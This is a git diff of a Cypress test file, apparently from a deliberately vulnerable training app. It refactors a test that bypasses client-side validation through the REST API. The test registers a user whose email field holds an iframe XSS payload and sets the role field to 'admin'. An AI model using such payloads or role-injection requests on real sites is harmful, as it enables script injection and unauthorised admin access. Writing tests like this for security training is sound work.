f940300ff99314af81a652555c04854a8d333b63
nidhi-vm <Nidhi.Vasani@ca.ey.com>
2025-06-12 14:54:58 -0400

    Updating using GitHub API 2025-06-12-14:54

--- test/cypress/e2e/register.spec.ts
+++ test/cypress/e2e/register.spec.ts
@@ -11,40 +11,44 @@ describe('/#/register', () => {
       })
     })
 
-    it('should be possible to bypass validation by directly using Rest API', async () => {
+    it('should be possible to bypass validation by directly using Rest API', () => {
       cy.task('isDocker').then((isDocker) => {
         if (!isDocker) {
-          cy.window().then(async () => {
-            const response = await fetch(
-              `${Cypress.config('baseUrl')}/api/Users/`,
-              {
-                method: 'POST',
-                cache: 'no-cache',
-                headers: {
-                  'Content-type': 'application/json'
-                },
-                body: JSON.stringify({
-                  email: '<iframe src="javascript:alert(`xss`)">',
-                  password: 'XSSed',
-                  passwordRepeat: 'XSSed',
-                  role: 'admin'
-                })
-              }
-            )
-            if (response.status === 201) {
-              console.log('Success')
-            }
-          })
-
-          cy.visit('/#/administration')
-          cy.on('window:alert', (t) => {
-            expect(t).to.equal('xss')
-          })
-          cy.expectChallengeSolved({ challenge: 'Client-side XSS Protection' })
+          handleXssBypass();
         }
       })
     })
   })
+
+  const handleXssBypass = () => {
+    cy.window().then(async () => {
+      const response = await fetch(
+        `${Cypress.config('baseUrl')}/api/Users/`,
+        {
+          method: 'POST',
+          cache: 'no-cache',
+          headers: {
+            'Content-type': 'application/json'
+          },
+          body: JSON.stringify({
+            email: '<iframe src="javascript:alert(`xss`)">',
+            password: 'XSSed',
+            passwordRepeat: 'XSSed',
+            role: 'admin'
+          })
+        }
+      )
+      if (response.status === 201) {
+        console.log('Success')
+      }
+    })
+
+    cy.visit('/#/administration')
+    cy.on('window:alert', (t) => {
+      expect(t).to.equal('xss')
+    })
+    cy.expectChallengeSolved({ challenge: 'Client-side XSS Protection' })
+  }
 
   describe('challenge "registerAdmin"', () => {
     it('should be possible to register admin user using REST API', () => {
